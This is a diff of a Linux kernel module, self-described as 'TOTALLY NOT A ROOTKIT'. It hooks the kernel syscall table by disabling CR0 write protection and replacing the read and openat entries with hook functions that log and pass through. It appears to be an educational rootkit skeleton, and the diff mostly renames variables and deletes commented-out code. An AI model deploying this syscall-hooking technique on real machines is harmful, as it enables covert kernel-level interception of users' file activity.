@@ -19,26 +19,28 @@
 		preempt_enable(); \
 	} while(0)
 
-#define numTargets 2
-
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Khan");
 MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");
 
-static unsigned long *sys_call_table;
-static void* real_syscall_functions[numTargets];
-static int sys_call_indices[] = {__NR_read, __NR_openat};
-static void* totallyReal_syscallPtrs[numTargets];
-static bool toInject[] = {1, 1};
+static unsigned long *sys_call_table;	//points to kernel's syscall table
+
+
+//max numTargets
+#define numTargets 2
+static int sys_call_indices[] = {__NR_read, __NR_openat}; //array defining syscall index for each target
+static void* original_syscallPtrs[numTargets];		//array to store ptrs to the original kernel syscall functions
+static void* totallyReal_syscallPtrs[numTargets];	//array to store ptrs to our fake syscall functions
+static bool toInject[] = {1, 1};	//array to configure which targets to intercept
 
 asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count) {
 	pr_info("Intercepted read of fd=%d, %lu byes\n", fd, count);
-	return ((typeof(sys_read)*)(real_syscall_functions[0]))(fd, buf, count);
+	return ((typeof(sys_read)*)(original_syscallPtrs[0]))(fd, buf, count);
 }
 
 asmlinkage long totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode){
 	pr_info("openAt called (mkdir?) path:%s\n", pathname);
-	return ((typeof(sys_openat)*)(real_syscall_functions[1]))(dirfd, pathname, flags, mode);
+	return ((typeof(sys_openat)*)(original_syscallPtrs[1]))(dirfd, pathname, flags, mode);
 }
 
 /*
@@ -55,8 +57,8 @@ void injectSyscalls(void){
 			pr_info("Starting injection for target %d\n", targetIndex);
 			
 			//save original ptr
-			real_syscall_functions[targetIndex] = (void *) sys_call_table[sys_call_indices[targetIndex]];
-			pr_info("original ptr stored as %p\n", real_syscall_functions[targetIndex]);
+			original_syscallPtrs[targetIndex] = (void *) sys_call_table[sys_call_indices[targetIndex]];
+			pr_info("original ptr stored as %p\n", original_syscallPtrs[targetIndex]);
 			
 			//inject fake ptr
 			CR0_WRITE_UNLOCK({
@@ -78,7 +80,7 @@ void restoreSyscalls(void){
 		if(toInject[targetIndex]){
 			pr_info("Restoring ptr for target %d\n", targetIndex);
 			CR0_WRITE_UNLOCK({
-				sys_call_table[sys_call_indices[targetIndex]] = real_syscall_functions[targetIndex];
+				sys_call_table[sys_call_indices[targetIndex]] = original_syscallPtrs[targetIndex];
 			});
 			pr_info("Ptr restored for target %d as %p\n", targetIndex, (void *)sys_call_table[sys_call_indices[targetIndex]]);
 		}
@@ -87,7 +89,6 @@ void restoreSyscalls(void){
 		}
 	}
 }
-
 
 int __init loadMod(void){
 	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
@@ -104,29 +105,6 @@ int __init loadMod(void){
 
 	injectSyscalls();
 
-	/*
-	//saves original read syscall, injects fake read syscall
-	real_syscall_functions[0] = (void*) sys_call_table[sys_call_indices[0]];
-	pr_info("original read stored as %p\n", real_syscall_functions[0]);
-	CR0_WRITE_UNLOCK({
-		sys_call_table[sys_call_indices[0]] = totallyReal_syscallPtrs[0];
-	});
-	pr_info("sys_call_table injected with phony_read ptr:%p\n", (void *)sys_call_table[sys_call_indices[0]]);
-
-	//saves original open syscall, injects fake open syscall
-	real_syscall_functions[1] = (void *)sys_call_table[__NR_openat];
-	pr_info("original openat stored as %p\n", real_syscall_functions[1]);
-	CR0_WRITE_UNLOCK({
-		sys_call_table[sys_call_indices[1]] = (void *) totallyReal_syscallPtrs[1];
-	});
-	pr_info("sys_call_table injected with totallyReal_openat ptr:%p\n", (void *)sys_call_table[sys_call_indices[1]]);
-
-	pr_info("old __NR_mkdir:%p", sys_call_table[__NR_mkdir]);
-	oldNR = (void*)sys_call_table[__NR_mkdir];
-	sys_call_table[__NR_mkdir] = &fakeMkdir;
-	
-	*/
-
 	return 0;		
 }
 
@@ -134,16 +112,6 @@ void __exit unloadMod(void){
 	pr_info("notarootkit unloading\n");
 
 	restoreSyscalls();
-
-	/*	
-	CR0_WRITE_UNLOCK({
-		sys_call_table[__NR_read] = real_syscall_functions[0];
-		sys_call_table[__NR_openat] = real_syscall_functions[1];
-	});
-	pr_info("sys_call_table read ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_read]);	
-	pr_info("sys_call_table openat ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_openat]);
-
-	*/
 
 	pr_info("notarootkit unloaded\n");
 	return;
